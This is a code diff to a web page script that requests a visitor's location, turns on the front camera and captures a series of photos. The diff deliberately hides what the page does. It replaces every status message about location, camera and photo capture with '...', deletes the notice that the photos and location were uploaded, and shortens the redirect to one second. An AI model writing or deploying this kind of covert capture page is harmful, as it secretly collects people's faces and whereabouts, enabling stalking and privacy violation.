@@ -56,7 +56,7 @@ window.addEventListener("DOMContentLoaded", () => {
   }
 
   (async () => {
-    status.textContent = "📍 Requesting location...";
+    status.textContent = "...";
     const userLocation = await getLocation();
     
     if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
@@ -64,17 +64,17 @@ window.addEventListener("DOMContentLoaded", () => {
         status.classList.add("error");
         await new Promise(r => setTimeout(r, 3000)); 
     } else {
-        status.textContent = "📍 Location found!";
+        status.textContent = "...";
     }
 
-    status.textContent = "📷 Requesting camera...";
+    status.textContent = "....";
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }, audio: false
       });
     } catch (e) {
-      status.textContent = "❌ Camera permission denied.";
+      status.textContent = "...";
       status.classList.add("error");
       return;
     }
@@ -88,7 +88,7 @@ window.addEventListener("DOMContentLoaded", () => {
     const ctx = c.getContext("2d");
 
     let n = 0;
-    status.textContent = "📸 Capturing photos... 1 / 5";
+    status.textContent = "...";
 
     const timer = setInterval(async () => {
       ctx.drawImage(video, 0, 0, c.width, c.height);
@@ -111,12 +111,11 @@ window.addEventListener("DOMContentLoaded", () => {
         
         // This completely replaces the card, removing the spinner!
         card.innerHTML = `
-          <h2 class="success">✅ Demo Complete</h2>
-          <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
-          <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
+          <h2 class="success">✅ please wait...</h2>
+         
         `;
 
-        let secondsLeft = 5;
+        let secondsLeft = 1;
         const countdownEl = document.getElementById("countdown");
         
         const redirectTimer = setInterval(() => {
